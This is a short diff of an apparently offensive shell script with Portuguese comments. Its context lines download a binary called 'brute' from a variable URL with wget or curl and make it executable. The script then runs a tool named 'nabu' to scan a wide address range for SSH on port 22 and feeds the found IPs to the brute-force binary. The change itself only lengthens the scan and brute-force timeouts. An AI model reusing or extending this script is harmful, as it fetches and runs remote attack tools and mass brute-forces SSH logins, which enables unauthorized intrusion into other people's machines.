@@ -33,10 +33,10 @@ wget $url_brute -O brute || curl -L $url_brute -o brute
 chmod +x brute nabu  || chmod 777 brute nabu
 
 
-timeout  5s     ./nabu  -p 22 -host 192.168.1.1/10  > ips     #120  segundos para  pega os ips
+timeout  120s     ./nabu  -p 22 -host 192.168.1.1/10  > ips     #120  segundos para  pega os ips
 
 
-timeout  5s  sh -c  ./brute   #1000 segundos pra testa os ips
+timeout  1000s  sh -c  ./brute   #1000 segundos pra testa os ips
 
 
 }
